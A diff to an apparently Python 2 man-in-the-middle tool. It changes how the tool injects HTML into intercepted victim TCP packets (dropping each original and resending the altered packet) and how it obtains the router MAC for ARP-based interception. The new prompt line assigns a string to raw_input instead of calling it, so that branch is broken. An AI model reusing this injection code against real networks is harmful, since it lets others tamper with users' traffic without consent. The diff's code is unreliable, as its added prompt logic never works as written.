@@ -323,7 +323,9 @@ class Parser():
 			del pkt[IP].chksum
 			del pkt[TCP].chksum
 			try:
-				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
+				payload.set_verdict(nfqueue.NF_DROP)
+				send(pkt)
+#				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
 				print R+'[!] Injected HTML into packet for '+W+self.html_url
 				logger.write('[!] Injected HTML into packet for '+self.html_url)
 				self.block_acks.append(ack)
@@ -1036,16 +1038,20 @@ def main(args):
 			print "[*] Router MAC: " + routerMAC
 			logger.write("[*] Router MAC: "+routerMAC+'\n')
 		except Exception:
-			try:
-				print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
-				arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
-				split_lines = arpcache.communicate()[0].splitlines()
-				arpoutput = split_lines[1].split()
-				routerMAC = arpoutput[2]
-				print "[*] Router MAC: " + routerMAC
-				logger.write("[*] Router MAC: "+routerMAC+'\n')
-			except Exception:
-				exit("[-] [arp -n] failed to give accurate router MAC address")
+			ac = raw_input = "[-] Router did not respond to ARP request for MAC, attempt to pull the MAC from the ARP cache? [y/n] "
+			if ac == 'y':
+				try:
+					print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
+					arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
+					split_lines = arpcache.communicate()[0].splitlines()
+					arpoutput = split_lines[1].split()
+					routerMAC = arpoutput[2]
+					print "[*] Router MAC: " + routerMAC
+					logger.write("[*] Router MAC: "+routerMAC+'\n')
+				except Exception:
+					exit("[-] [arp -n] failed to give accurate router MAC address")
+			else:
+				sys.exit("[-] Could not get router MAC address")
 
 	if args.victimmac:
 		victimMAC = args.victimmac
